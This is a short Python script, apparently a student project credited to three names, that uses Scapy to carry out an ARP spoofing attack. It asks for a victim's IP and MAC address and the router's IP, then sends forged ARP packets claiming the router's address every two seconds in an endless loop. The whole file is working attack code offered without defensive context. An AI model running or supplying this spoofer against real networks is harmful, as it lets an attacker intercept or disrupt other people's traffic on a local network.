"""
Rashmi Dodeja
Sandhya Murali
Shristika Yadav

ARP attack
"""
from scapy.all import *
import time

op=1

def main():
	victim = raw_input('Enter the target IP to hack: ')
	victim = victim.replace(" ", "")

	spoof = raw_input('Enter the routers IP: ')
	spoof = spoof.replace(" ", "")

	mac = raw_input('Enter the target MAC to hack: ')
	mac = mac.replace("-", ":")
	mac = mac.replace(" ", "")

	arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)
	# keep sending attacks continuously.
	while 1:
		send(arp)
		time.sleep(2)
	pass

if __name__=="__main__":
	main()